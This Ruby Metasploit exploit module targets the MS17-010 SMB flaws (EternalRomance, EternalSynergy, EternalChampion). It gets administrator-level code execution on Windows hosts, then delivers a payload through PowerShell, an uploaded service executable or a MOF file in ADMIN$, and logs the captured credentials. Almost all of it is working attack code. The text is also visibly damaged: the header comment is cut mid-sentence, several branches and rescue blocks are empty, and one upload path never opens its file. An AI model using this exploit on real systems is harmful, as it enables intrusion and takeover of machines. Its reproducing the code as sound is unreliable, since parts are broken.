# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# Windows XP systems that are not part of a domain default to treating all
# gaining administrative access to these systems. This setting can be found
# under:
#
#  Local Security Settings >
#   Local Policies >
#    Security Options >
#     Network Access: Sharing and security model for local accounts

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010
  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where
        primitive. This will then be used to overwrite the connection session information with as an
        Administrator session. From there, the normal psexec payload code execution is done.

        Exploits a type confusion between Transaction and WriteAndX requests and a race condition in
        Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy
        exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a
        named pipe.
      },
      &#039;Author&#039;         =>
        [
          &#039;sleepya&#039;,          # zzz_exploit idea and offsets
          &#039;zerosum0x0&#039;,
          &#039;Shadow Brokers&#039;,
          &#039;Equation Group&#039;
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039;     => 10,
          &#039;EXITFUNC&#039; => &#039;thread&#039;
        },
      &#039;References&#039;     =>
        [
          [ &#039;AKA&#039;, &#039;ETERNALSYNERGY&#039; ],
          [ &#039;AKA&#039;, &#039;ETERNALROMANCE&#039; ],
          [ &#039;AKA&#039;, &#039;ETERNALCHAMPION&#039; ],
          [ &#039;MSB&#039;, &#039;MS17-010&#039; ],
          [ &#039;CVE&#039;, &#039;2017-0143&#039;], # EternalRomance/EternalSynergy - Type confusion between WriteAndX and Transaction requests
          [ &#039;CVE&#039;, &#039;2017-0146&#039;], # EternalChampion/EternalSynergy - Race condition with Transaction requests
          [ &#039;CVE&#039;, &#039;2017-0147&#039;], # for EternalRomance reference
          [ &#039;URL&#039;, &#039;https://github.com/worawit/MS17-010&#039; ],
          [ &#039;URL&#039;, &#039;https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf&#039; ],
          [ &#039;URL&#039;, &#039;https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/&#039; ],
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;        => 3072,
          &#039;DisableNops&#039;  => true
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, { } ],
          [ &#039;PowerShell&#039;, { } ],
          [ &#039;Native upload&#039;, { } ],
          [ &#039;MOF upload&#039;, { } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Mar 14 2017&#039;
    ))

    register_options(
      [
        OptString.new(&#039;SHARE&#039;,     [ true, "The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share", &#039;ADMIN$&#039; ])
      ])

    register_advanced_options(
      [
        OptBool.new(&#039;ALLOW_GUEST&#039;, [true, "Keep trying if only given guest access", false]),
        OptString.new(&#039;SERVICE_FILENAME&#039;, [false, "Filename to to be used on target for the service binary",nil]),
        OptString.new(&#039;PSH_PATH&#039;, [false, &#039;Path to powershell.exe&#039;, &#039;Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#039;]),
        OptString.new(&#039;SERVICE_STUB_ENCODER&#039;, [false, "Encoder to use around the service registering stub",nil])
      ])
  end

  def exploit
    begin
      eternal_pwn(datastore[&#039;RHOST&#039;])
      smb_pwn()

    rescue ::Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010::MS17_010_Error => e
      print_error("#{e.message}")
    rescue ::Errno::ECONNRESET,
           ::Rex::Proto::SMB::Exceptions::LoginError,
           ::Rex::HostUnreachable,
           ::Rex::ConnectionTimeout,
           ::Rex::ConnectionRefused  => e
      print_error("#{e.class}: #{e.message}")
    rescue => error
      print_error(error.class.to_s)
      print_error(error.message)
      print_error(error.backtrace.join("\n"))
    ensure
      eternal_cleanup()       # restore session
    end
  end

  def smb_pwn()
    case target.name
    when &#039;Automatic&#039;
      if powershell_installed?
        print_status(&#039;Selecting PowerShell target&#039;)
        powershell
      else
        print_status(&#039;Selecting native target&#039;)
        native_upload
      end
    when &#039;PowerShell&#039;
      powershell
    when &#039;Native upload&#039;
      native_upload
    when &#039;MOF upload&#039;
      mof_upload
    end

    handler
  end


  # TODO: Again, shamelessly copypasta from the psexec exploit module. Needs to
  #       be moved into a mixin

  def powershell_installed?
    share = "\\\\#{datastore[&#039;RHOST&#039;]}\\#{datastore[&#039;SHARE&#039;]}"

    case datastore[&#039;SHARE&#039;].upcase
    when &#039;ADMIN$&#039;
      path = &#039;System32\\WindowsPowerShell\\v1.0\\powershell.exe&#039;
    when &#039;C$&#039;
      path = &#039;Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#039;
    else
      path = datastore[&#039;PSH_PATH&#039;]
    end

    simple.connect(share)

    vprint_status("Checking for #{path}")

    if smb_file_exist?(path)
      vprint_status(&#039;PowerShell found&#039;)
      psh = true
    else
      vprint_status(&#039;PowerShell not found&#039;)
      psh = false
    end

    simple.disconnect(share)

    psh
  end

  def powershell
    ENV[&#039;MSF_SERVICENAME&#039;] = datastore[&#039;SERVICE_NAME&#039;]
    command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)

    if datastore[&#039;PSH::persist&#039;] and not datastore[&#039;DisablePayloadHandler&#039;]
      print_warning("You probably want to DisablePayloadHandler and use exploit/multi/handler with the PSH::persist option")
    end

    # Execute the powershell command
    print_status("Executing the payload...")
    begin
      psexec(command)
    rescue StandardError => exec_command_error
      fail_with(Failure::Unknown, "#{peer} - Unable to execute specified command: #{exec_command_error}")
    end
  end

  def native_upload
    filename = datastore[&#039;SERVICE_FILENAME&#039;] || "#{rand_text_alpha(8)}.exe"
    servicename = datastore[&#039;SERVICE_NAME&#039;] || rand_text_alpha(8)
    serviceencoder = datastore[&#039;SERVICE_STUB_ENCODER&#039;] || &#039;&#039;

    # Upload the shellcode to a file
    print_status("Uploading payload...")
    smbshare = datastore[&#039;SHARE&#039;]
    # if SHARE = Users/sasha/ or something like this
    if smbshare =~ /.[\\\/]/
      subfolder = true
      smbshare = datastore[&#039;SHARE&#039;].dup
      smbshare = smbshare.gsub(/^[\\\/]/,"")
      folder_list = smbshare.split(/[\\\/]/)
      smbshare = folder_list[0]
      simple.connect("\\\\#{datastore[&#039;RHOST&#039;]}\\#{smbshare}")
    else
      subfolder = false
      simple.connect("\\\\#{datastore[&#039;RHOST&#039;]}\\#{smbshare}")
      fd = smb_open("\\#{filename}", &#039;rwct&#039;)
    end
    exe = &#039;&#039;
    opts = { :servicename => servicename, :serviceencoder => serviceencoder}
    begin
      exe = generate_payload_exe_service(opts)

      fd << exe
    ensure
      fd.close
    end

    if subfolder
    else
      print_status("Created \\#{filename}...")
    end

    # Disconnect from the share
    simple.disconnect("\\\\#{datastore[&#039;RHOST&#039;]}\\#{smbshare}")

    # define the file location
    if datastore[&#039;SHARE&#039;] == &#039;ADMIN$&#039;
      file_location = "%SYSTEMROOT%\\#{filename}"
    elsif datastore[&#039;SHARE&#039;] =~ /^[a-zA-Z]\$$/
      file_location = datastore[&#039;SHARE&#039;].slice(0,1) +  ":\\#{filename}"
    else
    end

    psexec(file_location, false)

    unless datastore[&#039;SERVICE_PERSIST&#039;]
      print_status("Deleting \\#{filename}...")
      if datastore[&#039;SHARE&#039;] =~ /.[\\\/]/
        simple.connect("\\\\#{datastore[&#039;RHOST&#039;]}\\#{smbshare}")
        begin
        rescue XCEPT::ErrorCode => e
        end
      else
        simple.connect("\\\\#{datastore[&#039;RHOST&#039;]}\\#{smbshare}")
        begin
          simple.delete("\\#{filename}")
        rescue XCEPT::ErrorCode => e
          print_error("Delete of \\#{filename} failed: #{e.message}")
        end
      end
    end
  end

  def mof_upload
    share = "\\\\#{datastore[&#039;RHOST&#039;]}\\ADMIN$"
    filename = datastore[&#039;SERVICE_FILENAME&#039;] || "#{rand_text_alpha(8)}.exe"

    # payload as exe
    print_status("Trying wbemexec...")
    print_status("Uploading Payload...")
    if datastore[&#039;SHARE&#039;] != &#039;ADMIN$&#039;
      print_error(&#039;Wbem will only work with ADMIN$ share&#039;)
      return
    end
    simple.connect(share)
    exe = generate_payload_exe
    fd = smb_open("\\system32\\#{filename}", &#039;rwct&#039;)
    fd << exe
    fd.close
    print_status("Created %SystemRoot%\\system32\\#{filename}")

    # mof to cause execution of above
    mofname = rand_text_alphanumeric(14) + ".MOF"
    mof = generate_mof(mofname, filename)
    print_status("Uploading MOF...")
    fd = smb_open("\\system32\\wbem\\mof\\#{mofname}", &#039;rwct&#039;)
    fd << mof
    fd.close
    print_status("Created %SystemRoot%\\system32\\wbem\\mof\\#{mofname}")

    # Disconnect from the ADMIN$
    simple.disconnect(share)
  end

  def report_auth
    service_data = {
        address: ::Rex::Socket.getaddress(datastore[&#039;RHOST&#039;],true),
        port: datastore[&#039;RPORT&#039;],
        service_name: &#039;smb&#039;,
        protocol: &#039;tcp&#039;,
        workspace_id: myworkspace_id
    }

    credential_data = {
        origin_type: :service,
        module_fullname: self.fullname,
        private_data: datastore[&#039;SMBPass&#039;],
        username: datastore[&#039;SMBUser&#039;].downcase
    }

    if datastore[&#039;SMBDomain&#039;] and datastore[&#039;SMBDomain&#039;] != &#039;WORKGROUP&#039;
      credential_data.merge!({
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: datastore[&#039;SMBDomain&#039;]
       })
    end

    if datastore[&#039;SMBPass&#039;] =~ /[0-9a-fA-F]{32}:[0-9a-fA-F]{32}/
      credential_data.merge!({:private_type => :ntlm_hash})
    else
      credential_data.merge!({:private_type => :password})
    end

    credential_data.merge!(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
        access_level: &#039;Admin&#039;,
        core: credential_core,
        last_attempted_at: DateTime.now,
        status: Metasploit::Model::Login::Status::SUCCESSFUL
    }

    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end

